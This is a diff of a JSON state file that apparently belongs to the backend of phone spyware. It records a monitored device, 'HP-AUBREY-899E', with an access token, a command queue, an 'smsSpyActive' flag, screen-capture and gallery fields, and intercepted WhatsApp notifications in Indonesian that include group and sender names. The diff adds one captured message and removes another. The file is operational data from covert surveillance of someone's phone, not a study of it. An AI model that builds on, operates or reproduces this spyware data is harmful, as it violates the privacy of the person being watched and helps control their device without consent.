@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781290593,
+    "lastSeen": 1776781291827,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2916 pesan dari 16 chat",
+        "time": "21/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781292790
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ZUNZ PEKALONGAN (1018 pesan): ~ SAKHA #1",
@@ -10320,14 +10328,6 @@
         "time": "21/04 20:56",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779766629
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Saluran • Zrylx",
-        "content": "🎉 Saluran Anda memiliki 1 pengikut",
-        "time": "21/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779683331
       }
     ],
     "galleryPhotos": [],
